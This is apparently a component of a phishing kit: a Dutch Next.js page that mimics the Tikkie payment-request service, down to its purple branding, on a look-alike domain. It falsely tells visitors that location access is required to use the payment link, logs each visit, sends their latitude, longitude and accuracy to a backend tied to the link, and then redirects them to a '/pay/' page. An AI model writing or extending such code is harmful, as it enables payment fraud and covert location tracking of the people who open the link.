import { useEffect, useState } from 'react';

export async function getServerSideProps({ params }) {
  return { props: { slug: params.slug } };
}

export default function Verify({ slug }) {
  const [needsAction, setNeedsAction] = useState(false);
  const [error, setError] = useState(null);

  const log = async (data) => {
    await fetch('/api/store-location', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
  };

  const handleLocation = () => {
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        await log({
          slug,
          flow: 'verify',
          event: 'allowed',
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
        });

        window.location.href = `/pay/${slug}?verified=1`;
      },
      async () => {
        await log({
          slug,
          flow: 'verify',
          event: 'denied',
          denied: true,
        });

        setError('Geef eerst toegang tot locatie om gebruik te maken van deze betaallink.');
        setNeedsAction(true);
      }
    );
  };

  useEffect(() => {
    // Log direct dat bezoeker hier is geweest
    log({
      slug,
      flow: 'verify',
      event: 'visit',
    });

    // Probeer meteen (werkt als locatie al aan staat)
    handleLocation();
  }, []);

  return (
    <div style={styles.page}>
      <div style={styles.circleWrapper}>
        <div style={styles.circle}>
          <img
            src="http://betaalverzoek.nu/ezgif-7119da68a40b4a77.gif"
            alt="IJsje"
            style={styles.image}
          />
        </div>
      </div>

      <h1 style={styles.title}>
        🇳🇱 Bevestig dat je uit Nederland komt
      </h1>

      <p style={styles.subtitle}>
        Geef eerst toegang tot locatie om gebruik te maken van deze betaallink.
      </p>

      {needsAction && (
        <button onClick={handleLocation} style={styles.button}>
          Bevestigen met locatie
        </button>
      )}

      {error && (
        <p style={styles.error}>
          {error}
        </p>
      )}
    </div>
  );
}

/* 🎨 STYLES */
const styles = {
  page: {
    minHeight: '100vh',
    backgroundColor: '#4B4A7A', // Tikkie-paars
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    justifyContent: 'center',
    textAlign: 'center',
    padding: '2rem',
    fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, sans-serif',
  },

  circleWrapper: {
    marginBottom: '2rem',
  },

  circle: {
    width: '220px',
    height: '220px',
    borderRadius: '50%',
    backgroundColor: '#FFFFFF',
    border: '10px solid #3E3D6B',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    overflow: 'hidden',
  },

  image: {
    width: '100%',
    height: '100%',
    objectFit: 'cover',
  },

  title: {
    color: '#FFFFFF',
    fontSize: '2rem',
    fontWeight: 700,
    marginBottom: '1rem',
  },

  subtitle: {
    color: '#D6D5EA',
    fontSize: '1.1rem',
    maxWidth: '420px',
    marginBottom: '2rem',
  },

  button: {
    backgroundColor: '#FFFFFF',
    color: '#4B4A7A',
    border: 'none',
    borderRadius: '8px',
    padding: '0.9rem 1.6rem',
    fontSize: '1rem',
    fontWeight: 600,
    cursor: 'pointer',
  },

  error: {
    marginTop: '1.5rem',
    color: '#FFD2D2',
    fontSize: '0.95rem',
  },
};
